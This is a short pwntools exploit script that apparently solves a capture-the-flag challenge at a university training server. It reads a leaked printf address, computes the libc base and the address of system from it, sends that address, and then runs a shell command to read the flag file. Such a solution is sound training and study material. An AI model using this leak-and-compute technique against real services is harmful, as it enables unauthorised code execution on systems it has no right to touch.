from pwn import *

REMOTE = True

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 9105

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin')

libc = ELF("./libc.so.6")

printf_libc_offset = libc.symbols["printf"]
system_libc_offset = libc.symbols["system"]

conn.recvuntil(b"is at ")
printf_address = int(conn.recvuntil(b",", drop=True), 16)

base_address = printf_address - printf_libc_offset
system_address = base_address + system_libc_offset
print(system_address)

conn.recvuntil(b"?")
conn.sendline(str(system_address).encode())

if(b"Nope" in conn.recvline()):
    conn.close()
    print("ERROR")
else:
    conn.sendline(b"cat flag.txt")
    flag = conn.recvuntil(b"}").decode()
    conn.close()
    print(flag)